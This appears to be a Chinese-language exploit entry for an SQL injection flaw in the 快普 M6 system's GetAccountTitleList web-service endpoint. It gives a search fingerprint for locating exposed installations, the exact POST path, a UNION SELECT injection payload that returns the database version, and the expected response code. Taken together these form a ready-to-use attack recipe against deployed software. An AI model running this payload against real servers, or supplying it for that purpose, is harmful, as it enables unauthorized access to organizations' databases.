# 快普M6GetAccountTitleList存在SQL注入漏洞

快普 ｜ SQL注入 ｜ —
- **指纹**：`body="Resource/JavaScript/jKPM6.DateTime.js"`
- **请求**：`POST /WebService/wsAutoComplete.asmx/GetAccountTitleList HTTP/1.1`

**Payload**
```
prefixText=a'+UNION+ALL+SELECT+@@VERSION,NULL,NULL--&count=1
```
- **响应特征**：500